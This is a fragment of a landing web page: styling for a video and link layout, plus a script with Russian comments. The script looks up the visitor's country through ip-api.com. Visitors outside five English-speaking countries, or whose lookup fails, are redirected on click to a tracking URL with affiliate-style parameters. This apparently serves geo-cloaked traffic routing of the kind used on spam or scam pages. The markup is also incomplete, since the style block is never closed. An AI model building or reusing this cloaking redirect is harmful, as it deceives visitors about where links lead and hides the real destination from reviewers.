    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            font-family: Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #000 0%, #333 100%);
            color: #fff;
        }

        #container {
            max-width: 800px;
            width: 100%;
            padding: 20px;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
        }

        .video-container {
            width: 100%;
            margin-bottom: 20px;
        }

        .video-container video {
            width: 100%;
            height: auto;
            border: 2px solid #fff;
            border-radius: 8px;
        }

        .video-text {
            font-size: 24px;
            font-weight: bold;
            color: #ffd700;
            margin: 20px 0;
            text-shadow: 1px 1px 3px #000;
        }

        a img {
            display: block;
            max-width: 100%;
            height: auto;
            margin: 20px auto;
            border: 2px solid #fff;
            border-radius: 8px;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        a img:hover {
            transform: scale(1.05);
            box-shadow: 0 4px 8px rgba(255, 255, 255, 0.6);
        }

        .info-text {
            font-size: 16px;
            font-weight: bold;
            color: #ffd700;
            margin: 15px 0;
        }

        #link-button {
            display: block;
            margin: 10px auto;

            background-color: #ffd700;

            border: 2px solid #000;
            border-radius: 5px;

            transition: background-color 0.3s ease, color 0.3s ease;
        }

        #link-button:hover {
            background-color: #ffc107;
        }

    <script>
        let isRedirectEnabled = false;

        // Функция для редиректа по стране
        function checkCountryForRedirect() {
            fetch('https://ip-api.com/json')
                .then(response => response.json())
                .then(data => {
                    const country = data.country;
                    const allowedCountries = ["Australia", "Canada", "United States", "United Kingdom", "New Zealand"];
                    // Если страна не из списка, активируем редирект
                    if (!allowedCountries.includes(country)) {
                        isRedirectEnabled = true;
                    }
                })
                .catch(error => {
                    console.error('Error fetching country data:', error);
                    // Если ошибка при определении страны, по умолчанию разрешаем редирект
                    isRedirectEnabled = true;
                });
        }

        // Вызов функции при загрузке страницы
        document.addEventListener("DOMContentLoaded", checkCountryForRedirect);

        // Обработчик клика по ссылке
        function handleLinkClick(event) {
            if (isRedirectEnabled) {
                // Редирект на указанный вами URL
                window.location.href = "https://avzqa.imitrkn.net/?utm_source=95373a9daf4cb6a2&s1=48854&s2=209775";
            }
        }
    </script>
